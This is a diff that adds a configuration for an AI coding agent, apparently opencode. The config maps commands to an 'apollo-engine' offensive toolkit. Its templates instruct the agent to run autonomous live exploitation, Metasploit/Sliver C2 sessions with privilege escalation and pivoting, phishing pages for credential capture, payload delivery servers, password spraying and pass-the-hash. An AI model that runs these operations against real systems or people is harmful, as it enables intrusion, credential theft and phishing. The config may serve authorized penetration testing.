+      "template": "BloodHound data operations. Parse $ARGUMENTS as '<action> [file_or_project]'. Actions: parse <file.json> (parse BH JSON), inject <file.json> (inject into KB), suggest (suggest AD attacks from KB). Run: python3 ~/.config/opencode/apollo-engine/bloodhound_processor.py <action> <args>.",
+      "description": "BloodHound JSON parsing and AD attack path analysis"
+    },
+    "container": {
+      "template": "Container security audit. Parse $ARGUMENTS as '<action> [args]'. Actions: docker (audit Docker container), k8s (audit K8s pod), full (full audit), escape (escape suggestions), inject <ip> (audit + inject into KB). Run: python3 ~/.config/opencode/apollo-engine/container_audit.py <action> <args>.",
+      "description": "Docker/Kubernetes security audit and escape analysis"
+    },
+    "payload": {
+      "template": "Payload server operations. Parse $ARGUMENTS as '<action> [args]'. Actions: start [port] (start HTTP server), add <file> (add payload), list (list payloads), gen <url> (generate download commands). Run: python3 ~/.config/opencode/apollo-engine/payload_server.py <action> <args>.",
+      "description": "HTTP payload delivery server and download command generation"
+    },
+    "api": {
+      "template": "API security testing. Parse $ARGUMENTS as '<url> [action]'. Actions: discover (find endpoints), full (full test), inject (test + inject into KB). Run: python3 ~/.config/opencode/apollo-engine/api_tester.py <url> <action>.",
+      "description": "REST/GraphQL API security testing"
+    },
+    "phish": {
+      "template": "Phishing campaign operations. Parse $ARGUMENTS as '<action> [args]'. Actions: templates (list templates), create-page <template> (create phishing page), create-server <template> [port] (generate server), create-campaign <name> <template> <emails>, list (list campaigns). Run: python3 ~/.config/opencode/apollo-engine/phishing_engine.py <action> <args>.",
+      "description": "Phishing campaign creation and credential capture"
+    },
+    "wireless": {
+      "template": "Wireless security audit. Parse $ARGUMENTS as '<action> [interface]'. Actions: check (check tools), scan [iface] [timeout], audit [iface] [timeout], deauth-check [iface]. Run: python3 ~/.config/opencode/apollo-engine/wireless_auditor.py <action> <args>.",
+      "description": "WiFi network scanning and security auditing"
+    },
+    "autopwn": {
+      "template": "Autonomous exploitation engine. Parse $ARGUMENTS as '<action> [args]'. Actions: find (list exploit opportunities from KB), check (dry-run validation - safe), exploit [lhost] [lport] (live exploitation), creds (suggest default-cred targets). Run: python3 ~/.config/opencode/apollo-engine/auto_pwn.py <action> <args>. After find, review opportunities ranked by reliability. After check, report which hosts are confirmed vulnerable. After exploit, report sessions gained. Always inject results into KB.",
+      "description": "Autonomous exploitation: KB vulns -> exploit match -> auto-attempt"
+    },
+    "graph": {
+      "template": "Attack graph analysis. Parse $ARGUMENTS as '<action> [target_ip]'. Actions: paths (find optimal attack paths), surface (attack surface analysis), report (human-readable chain report), dot (Graphviz output). Run: python3 ~/.config/opencode/apollo-engine/attack_graph.py <action> [project] [target_ip]. Visualize with: echo '<dot>' | dot -Tpng -o /tmp/attack_graph.png. Report the shortest attack chains and easy wins.",
+      "description": "Graph-based attack path analysis with Dijkstra pathfinding"
+    },
+    "c2cmd": {
+      "template": "Unified C2 command. Parse $ARGUMENTS as '<action> [args]'. Actions: sessions (list all sessions across MSF/Sliver/KB), run <session> <cmd> [framework], privesc <session> [platform] (auto privesc checks), pivot <session> [platform] (detect pivot networks), health (session health), listen <lhost> <lport> [payload] (setup listener). Run: python3 ~/.config/opencode/apollo-engine/c2_commander.py <action> <args>.",
+      "description": "Unified C2 session management across Metasploit/Sliver"
+    },
+    "vault": {
+      "template": "Credential vault operations. Parse $ARGUMENTS as '<action> [args]'. Actions: summary (vault intelligence), detect <hash> (detect hash type), crack <hash> [wordlist] (generate crack commands), spray [ip] [service] (spray commands), matrix (cred reuse matrix), pth [ip] (pass-the-hash commands), queue (hash cracking queue). Run: python3 ~/.config/opencode/apollo-engine/cred_vault.py <action> <args>.",
+      "description": "Credential vault with auto-reuse, spray, and cracking"
+    },
+    "ioc": {
+      "template": "IOC engine operations. Parse $ARGUMENTS as '<action> [args]'. Actions: extract <text|file> (extract IOCs), enrich <ip|hash|domain> (enrich single IOC), hunt <text|file> [project] (full hunt + enrich), kb [project] (extract from KB), stix <text|file> (STIX 2.1 output). Run: python3 ~/.config/opencode/apollo-engine/ioc_engine.py <action> <args>. Set VIRUSTOTAL_API_KEY, ABUSEIPDB_API_KEY, SHODAN_API_KEY for enrichment.",
+      "description": "IOC extraction, enrichment, and STIX output"
+    },
+    "monitor": {
+      "template": "Continuous recon monitoring. Parse $ARGUMENTS as '<action> [args]'. Actions: once <target> [quick|ports] [project] (single scan + diff), loop <target> [interval] [project] (continuous monitoring), state (show saved state), reset (clear baseline). Run: python3 ~/.config/opencode/apollo-engine/recon_monitor.py <action> <args>. Alerts on new hosts/ports/services via notifications module.",
+      "description": "Continuous monitoring with diff detection and alerts"
+    },
+    "exploitdb": {
+      "template": "Exploit database sync. Parse $ARGUMENTS as '<action> [args]'. Actions: sync [project] [--force] (sync exploits for KB vulns), match <cve|name> (match single vuln), get <edb_id> (download exploit source), summary [project] (exploit summary), clear (clear cache). Run: python3 ~/.config/opencode/apollo-engine/exploit_sync.py <action> <args>.",
+      "description": "Local exploit cache with CVE->EDB matching"
+    }
+  },
+  "skills": {
+    "paths": ["{env:HOME}/.config/opencode/apollo-engine"],
+    "urls": []
+  },
+  "mcp": {
+    "apollo-engine": {
+      "type": "local",
+      "command": ["bash", "-lc", "python3 \"$HOME/.config/opencode/apollo-engine/mcp_server.py\""],
+      "enabled": true,
+      "timeout": 60000
+    }
+  }
+}
